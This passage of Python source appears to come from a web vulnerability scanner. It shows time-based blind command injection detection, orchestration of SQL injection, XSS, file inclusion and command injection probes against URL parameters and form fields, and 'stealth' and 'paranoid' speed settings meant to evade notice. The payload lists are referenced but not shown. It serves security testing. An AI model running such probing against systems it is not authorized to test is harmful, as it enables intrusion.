                        evidence={"param": param, "payload": payload, "probe": probe,
                                  "match": pat.pattern, "method": "POST" if post else "GET", "url": url},
                        remediation="Never pass user input to a shell; use argument arrays / safe APIs.",
                        cwe="CWE-78",
                    )
                    return

        # 2) Time-based blind — DIFFERENTIAL timing to defeat server jitter:
        #    only flag if doubling the injected sleep adds ~that much delay, i.e.
        #    the response time is CONTROLLED by our payload, not random latency.
        #    A naturally slow/jittery endpoint won't scale, so it won't false-fire.
        base = max((await _probe("1"))[0], (await _probe("1"))[0])
        if base > 3.0:
            return  # endpoint too slow/variable for reliable timing
        for payload, sleep_secs, probe in CMDI_TIME_PROBES:
            if str(sleep_secs) not in payload:
                continue  # only sleep-style payloads support the scaling check
            margin = sleep_secs * _TIME_THRESHOLD_FACTOR
            el1, _ = await _probe(payload, timeout=float(sleep_secs + 8))
            if el1 < base + margin:
                continue
            # Confirm: double the sleep → ~sleep_secs MORE delay (proves control).
            big_payload = payload.replace(str(sleep_secs), str(sleep_secs * 2), 1)
            el2, _ = await _probe(big_payload, timeout=float(sleep_secs * 2 + 8))
            if el2 >= el1 + margin:
                self._add_finding(
                    target=url, vuln_type="cmdi",
                    title=f"OS Command Injection (time-based blind) — param '{param}'",
                    severity="critical", confidence=0.85,
                    evidence={"param": param, "payload": payload, "probe": probe,
                              "technique": "time_blind_differential",
                              "baseline_sec": round(base, 2),
                              "elapsed_sleep_sec": round(el1, 2),
                              "elapsed_double_sec": round(el2, 2),
                              "method": "POST" if post else "GET", "url": url},
                    remediation="Never pass user input to a shell; use argument arrays / safe APIs.",
                    cwe="CWE-78",
                )
                return

    async def _scan_url(self, session, url: str, forms: list[dict] | None = None) -> None:
        """Scan a single URL — GET params + POST forms."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)

        # GET param baseline
        if qs:
            _, baseline = await _get(session, url, self._headers)
            tasks = []
            for param in qs:
                tasks.append(self._test_sqli_param(session, url, param, baseline))
                tasks.append(self._test_sqli_boolean_param(session, url, param, baseline))
                tasks.append(self._test_sqli_union_param(session, url, param, baseline))
                tasks.append(self._test_sqli_time_param(session, url, param))
                tasks.append(self._test_xss_param(session, url, param))
                tasks.append(self._test_inclusion_param(session, url, param, baseline))
                tasks.append(self._test_cmdi_param(session, url, param, baseline))
            await asyncio.gather(*tasks)

        # POST forms
        if forms:
            for form in forms:
                action = form.get("action") or url
                if not action.startswith("http"):
                    base = f"{parsed.scheme}://{parsed.netloc}"
                    action = base + ("/" if not action.startswith("/") else "") + action

                fields: dict = {}
                for field_info in form.get("fields", []):
                    name = field_info.get("name", "")
                    if name:
                        fields[name] = field_info.get("value", "test")

                if not fields:
                    continue

                _, baseline = await _post(session, action, fields, self._headers)

                tasks = []
                for param in list(fields.keys()):
                    others = {k: v for k, v in fields.items() if k != param}
                    tasks.append(self._test_sqli_post(session, action, param, baseline, others))
                    tasks.append(self._test_xss_post(session, action, param, others))
                    tasks.append(self._test_inclusion_param(
                        session, action, param, baseline, post=True, other_fields=others))
                    tasks.append(self._test_cmdi_param(
                        session, action, param, baseline, post=True, other_fields=others))
                await asyncio.gather(*tasks)

        # Header injection check (once per URL)
        await self._test_header_injection(session, url)

    # ── Public API ────────────────────────────────────────────────

    async def scan(
        self,
        targets: list[str],
        crawl_data: Optional[dict] = None,
        forms_by_url: Optional[dict[str, list]] = None,
    ) -> dict:
        """
        Main entry point.

        Args:
            targets: list of URLs to probe (from crawler or orchestrator).
            crawl_data: raw crawler result dict — used to pull forms/input vectors.
            forms_by_url: pre-extracted {url: [form_dict, ...]} mapping.

        Returns:
            {'findings': [...], 'urls_tested': int, 'error': None}
        """
        if aiohttp is None:
            return {"findings": [], "urls_tested": 0, "error": "aiohttp not installed"}

        # Merge form data from crawl_data if provided
        merged_forms: dict[str, list] = dict(forms_by_url or {})
        if crawl_data:
            for page in crawl_data.get("pages", []):
                page_url = page.get("url", "")
                if page_url and page.get("forms"):
                    merged_forms.setdefault(page_url, []).extend(page["forms"])
            # Some crawlers store forms at top-level
            for form in crawl_data.get("forms", []):
                action = form.get("action", "")
                if action:
                    merged_forms.setdefault(action, []).append(form)

        # De-duplicate target list
        seen_urls: set[str] = set()
        unique_targets: list[str] = []
        for t in targets:
            if t and t not in seen_urls:
                seen_urls.add(t)
                unique_targets.append(t)

        logger.info(f"InjectionScanner: testing {len(unique_targets)} URLs")

        connector = aiohttp.TCPConnector(ssl=False, limit=50)
        # Pick up the active auth session (cookie jar + headers) if `heaven scan
        # --cookie-file` or `--auth` was used. Otherwise this is a no-op.
        from heaven.recon.auth_session import aiohttp_session_kwargs
        _auth_kw = aiohttp_session_kwargs()
        async with aiohttp.ClientSession(connector=connector, **_auth_kw) as session:
            tasks = [
                self._scan_url(session, url, forms=merged_forms.get(url))
                for url in unique_targets
            ]
            await asyncio.gather(*tasks, return_exceptions=True)

        logger.info(f"InjectionScanner: {len(self._findings)} candidate findings across {len(unique_targets)} URLs")
        return {
            "findings": self._findings,
            "urls_tested": len(unique_targets),
            "error": None,
        }


# ─────────────────────────────────────────────────────────────────
# Convenience wrapper used by the orchestrator
# ─────────────────────────────────────────────────────────────────

async def scan_for_injections(
    targets: list[str],
    crawl_data: Optional[dict] = None,
    forms_by_url: Optional[dict] = None,
    concurrency: int = 20,
    request_delay: float = 0.0,
    stealth_level: str = "normal",
) -> dict:
    """
    Top-level function called from the orchestrator.

    stealth_level maps to concurrency/delay:
      aggressive  → concurrency=40, delay=0
      normal      → concurrency=20, delay=0
      stealth     → concurrency=10, delay=0.5
      paranoid    → concurrency=5,  delay=2.0
    """
    level_map = {
        "aggressive": (40, 0.0),
        "normal": (20, 0.0),
        "stealth": (10, 0.5),
        "paranoid": (5, 2.0),
    }
    concurrency, delay = level_map.get(stealth_level, (20, 0.0))

    scanner = InjectionScanner(concurrency=concurrency, request_delay=delay)
    return await scanner.scan(targets, crawl_data=crawl_data, forms_by_url=forms_by_url)
